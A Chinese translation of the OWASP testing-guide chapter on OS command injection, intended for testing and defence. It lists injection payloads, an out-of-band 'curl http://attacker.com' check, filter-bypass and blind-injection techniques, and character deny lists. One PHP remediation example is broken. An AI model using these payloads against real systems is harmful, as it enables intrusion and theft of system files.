# 测试命令注入

|ID          |
|------------|
|WSTG-INPV-12|

## 概述

本文描述如何测试应用程序是否存在OS命令注入。测试人员将尝试通过HTTP请求向应用程序注入OS命令。

OS命令注入是当用户输入直接传递给操作系统命令而没有适当验证或清理时发生的漏洞。这允许攻击者注入和执行服务器上的任意命令，可能导致未授权数据访问、数据篡改和完全服务器危害。可以通过在应用程序的设计和开发过程中强调安全性来防止此漏洞。

## 测试目标

- 识别和评估命令注入点。
- 绕过特殊字符和OS命令过滤器。

## 如何测试

当在Web应用程序中查看文件时，文件名通常显示在URL中。Perl允许通过open语句从进程管道传输数据。用户可以简单地将管道符号`|`附加到文件名末尾。

更改前的示例URL：

`https://sensitive/cgi-bin/userData.pl?doc=user1.txt`

更改后的示例URL：

`https://sensitive/cgi-bin/userData.pl?doc=/bin/ls|`

这将执行命令`/bin/ls`。

在.PHP页面URL末尾附加分号，后跟操作系统命令，将执行该命令。`%3B`是URL编码的，解码为分号

示例：

`https://sensitive/something.php?dir=%3Bcat%20/etc/passwd`

### 示例

考虑一个包含可从互联网浏览的文档的应用程序。如果您启动个人代理（如ZAP或Burp Suite），您可以获得如下POST HTTP（`https://www.example.com/public/doc`）：

```txt
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: https://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf
```

在此POST请求中，我们注意到应用程序如何检索公共文档。现在我们可以测试是否可以添加操作系统命令来在POST HTTP中注入。尝试以下操作（`https://www.example.com/public/doc`）：

```txt
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: https://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf+|+Dir c:\
```

如果应用程序不验证请求，我们可以获得以下结果：

```txt
    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
    Output...
    Il volume nell'unità C non ha etichetta.
    Numero di serie Del volume: 8E3F-4B61
    Directory of c:\
     18/10/2006 00:27 2,675 Dir_Prog.txt
     18/10/2006 00:28 3,887 Dir_ProgFile.txt
     16/11/2006 10:43
        Doc
        11/11/2006 17:25
           Documents and Settings
           25/10/2006 03:11
              I386
              14/11/2006 18:51
              h4ck3r
              30/09/2005 21:40 25,934
              OWASP1.JPG
              03/11/2006 18:29
                  Prog
                  18/11/2006 11:20
                      Program Files
                      16/11/2006 21:12
                          Software
                          24/10/2006 18:25
                              Setup
                              24/10/2006 23:37
                                  Technologies
                                  18/11/2006 11:14
                                  3 File 32,496 byte
                                  13 Directory 6,921,269,248 byte disponibili
    Return code: 0
```

在这种情况下，我们成功执行了OS注入攻击。

## 命令注入的特殊字符

特殊字符用于将多个命令链接在一起。
这些字符因Web服务器上运行的操作系统而异。
例如，以下类型的命令链接可用于Windows和基于Unix的系统：

- `cmd1|cmd2`：无论cmd1成功与否，cmd2都将执行。
- `cmd1||cmd2`：仅当cmd1失败时，cmd2才执行。
- `cmd1&&cmd2`：仅当cmd1成功时，cmd2才执行。
- `cmd1&cmd2`：无论cmd1成功与否，cmd2都将执行。

注意，`;`适用于Unix系统和PowerShell。但是，它不适用于Windows命令提示符（CMD）。
此外，您可以使用Bash命令替换`$(cmd)`或`` `cmd` ``在基于Unix的系统上执行命令。
此外，还可以使用Linux文件描述符，例如`>(cmd)`、`<(cmd)`。

## 其他命令注入技术

攻击者可以利用不同技术根据环境 和过滤机制执行操作系统命令。

### 命令替换

命令替换允许将一个命令的输出用作另一个命令的输入。

示例：

```bash
$(whoami)
`whoami`
```

### 命令链接

可以使用命令链接运算符顺序执行多个命令。

示例：

```bash
cmd1 ; cmd2
cmd1 && cmd2
cmd1 || cmd2
```

### 文件重定向

攻击者可以将命令输出重定向到攻击者可访问的文件。

示例：

```bash
whoami > /var/www/html/output.txt
```

### 带外命令注入

攻击者可以使用外部服务检测命令执行。

示例：

```bash
curl http://attacker.com
nslookup attacker.com
```

## 过滤器绕过

为了防止OS命令注入，Web开发人员通常使用过滤器。但是，这些过滤器有时没有正确实现，从而允许攻击者绕过它们。
在本节中，我们将介绍用于绕过这些过滤器的不同技术。

### 方法论

首先，了解过滤器的工作原理然后尝试绕过它始终是最佳实践。
以下是我们遇到过滤器时可以采用的方法：

- 过滤器是客户端还是服务器端？
- 过滤器应用于特殊字符、操作系统命令还是两者？
- Web应用程序使用允许列表还是阻止列表过滤器？
- Web服务器上运行的是什么操作系统？这使我们可以了解可以使用的命令和特殊字符。

### 特殊字符过滤器绕过

如前所述，过滤器可以应用于特殊字符、操作系统命令或两者。
要绕过应用于特殊字符的过滤器，我们可以使用环境变量、Bash大括号扩展或URL编码。

#### URL编码

URL编码特殊字符可以让我们绕过过滤器，如果Web服务器仅阻止明文特殊字符。
以下是一些特殊字符及其URL编码格式：

|特殊字符|URL编码|
|-----------------|------------|
|;                | %3b        |
|space            | %20        |
|tab              | %09        |
|&                | %26        |
|New line         | %0a        |

例如，不要使用`;whoami`，我们可以使用`%3bwhoami`。

#### 环境变量

空格、分号、制表符或换行符等特殊字符通常会被Web服务器过滤，特别是当它们对指定输入无用时。
为了逃避这种限制，我们可以使用环境变量，例如Linux上的**IFS**、**PATH**或**LS_COLORS**，以及Windows上的**HOMEPATH**。
例如，在Linux上，`/`、`;`可以分别替换为`${PATH:0:1}`、`${LS_COLORS:10:1}`和`${IFS}`。
在Windows CMD上，我们可以用`%HOMEPATH:~6,1%`替换`\`，或在PowerShell中使用`$env:HOMEPATH[0]`。

#### Bash大括号扩展

Bash大括号扩展是Bash的一项功能，允许您使用大括号执行命令。
例如，`{ls,-la}`将执行`ls -la`命令。如果Web服务器过滤空格、换行符或制表符，这将非常有用。
假设我们要显示'/etc/passwd'文件的内容。因此，不要使用`;cat /etc/passwd`，我们可以使用`;{cat,/etc/passwd}`。
也就是说，重要的是要记住，只有当Web服务器使用Bash且不过滤`}{/`等字符时，此技术才有效。

### 命令过滤器绕过

在本节中，我们将探索一些用于绕过应用于操作系统命令的过滤器的技术。

#### 大小写修改

大小写修改是一种用于绕过OS命令过滤器的技术。如果服务器端过滤器区分大小写，这将有帮助。
例如，如果我们在测试中注意到Web服务器阻止了`;whoami`，，我们可以尝试使用`;WhoAmI`，并看到服务器端过滤器仅阻止小写命令，我们将能够绕过它。
请注意，此技术通常适用于Windows系统。
在Linux上，我们将使用一种称为**字符转换**的技术。例如，以下命令会将每个大写字符转换为其对应的小写字符。

```bash
;$(tr "[A-Z]" "[a-z]"<<<"WhoaMi")
```

#### 字符插入

字符`\`; `$@`, `'`可以插入到Linux OS命令中，而不影响命令的正常执行。
例如，`who\ami`, `w$@hoami`或`wh'o'ami`都将执行`whoami`命令

请注意，Linux命令中单引号`'`的数量必须为**偶数**，否则会出现错误。如果使用Windows CMD，请确保使用双引号`"`代替。
此外，您还可以在CMD命令中使用插入符号`^`。例如，`whoa^mi`将执行`whoami`命令。这在PowerShell中不起作用。

#### Base64编码

在某些情况下，Web服务器可能过滤命令，如`whoami`、`id`等。
假设`whoami`被Web服务器阻止。因此，我们不能使用`;whoami`之类的有效载荷。
为了绕过此限制，我们将使用`whoami`的base64编码格式：`echo -n 'whoami' | base64`执行。这将返回`d2hvYW1p`。
然后，我们将发送以下有效载荷：`;bash<<<$(base64 -d<<< d2hvYW1p)`在易受攻击的参数中。这应该能够绕过服务器端过滤器并允许我们实现远程命令执行。

**最后，请注意，您可能需要组合不同的特殊字符和OS命令过滤器绕过技术，以成功绕过Web服务器设置的过滤器。**

## 盲命令注入

有时，我们可能无法在Web服务器的HTTP响应中看到注入命令的输出。因此，我们需要找到一种方法确认我们的注入是否成功。为此，我们可以使用HTTP、DNS或SMTP远程服务器（在我们控制下）。
我们还可以使用**时间延迟系统命令**，如Linux上的`sleep`、Windows上的`timeout`，或网络实用程序如`ping`。
例如，我们可以执行`;sleep(5)`，如果Web服务器在向我们返回响应之前等待5秒，我们就可以确认它容易受到盲命令注入。
此外，我们还可以**将注入命令的输出重定向到Web服务器的Web根目录**。`;whoami>/var/www/html/poc.txt;`
之后，我们可以执行`curl http://website.com/poc.txt`。如果我们能够检索文件，那么就可以确认Web服务器容易受到盲命令注入。

## 危险的命令执行API

以下不同编程语言中的API可以执行操作系统命令，如果与未清理的用户输入一起使用，可能会引入命令注入漏洞。

| 语言 | 危险API |
|---------|---------------|
| Java | `Runtime.exec()` |
| C/C++ | `system()`, `exec()`, `ShellExecute()` |
| Python | `exec()`, `eval()`, `os.system()`, `os.popen()`, `subprocess.Popen()`, `subprocess.call()` |
| PHP | `system()`, `shell_exec()`, `exec()`, `proc_open()`, `eval()`, `passthru()` |
| Node.js | `child_process.exec()`, `execSync()`, `spawn()` |
| Ruby | `system()`, `exec()`, `Open3.popen3()` |
| Go | `exec.Command()` |
| C# | `Process.Start()` |

## 修复

### 清理

URL查询参数和表单数据需要验证和清理，以防止注入恶意字符。
字符阻止列表是一种选择，但可能难以考虑所有要验证的字符。也可能有一些尚未发现的字符。
应创建仅包含授权字符或命令的允许列表来验证用户输入。允许列表将消除遗漏的字符以及未发现的威胁。

命令注入的通用拒绝列表包括`` `|` `;` `&` `$` `>` `<` `'` `\` `!` `>>` `#` ``

Windows的转义或过滤特殊字符，`(` `)` `<` `>` `&` `*` `'` `|` `=` `?` `[` `]` `^` `~` `!` `.` `"` `%` `@` `/` `\` `:` `+` `,`  ``` ` ```

Linux的转义或过滤特殊字符，`{` `}` `(` `)` `>` `<` `&` `*` `'` `|` `=` `?` `[` `]` `$` `–` `#` `~` `!` `.` `"` `%` `/` `\` `:` `+` `,`  ``` ` ```

此外，避免在应用程序中使用执行操作系统命令的函数，除非绝对必要。例如，不要使用`system("cp /path/to/file1.txt /path/to/file2.txt")`来复制文件，您可以直接使用PHP内置函数`copy("cp /path/to/file1.txt, /path/to/file2.txt")`，其作用完全相同。请注意，其他开发语言/框架通常提供类似的内置功能。

### 权限

Web应用程序及其组件应以不允许操作系统命令执行的严格权限运行。尝试从灰盒测试角度验证所有这些信息。

## 工具

- OWASP [WebGoat](https://owasp.org/www-project-webgoat/)
- [Commix](https://github.com/commixproject/commix)
- [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)

## 参考资料

- [CWE-78：操作系统命令中特殊元素的不当中和（"OS命令注入"）](https://cwe.mitre.org/data/definitions/78.html)
- [ENV33-C。不要调用system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)
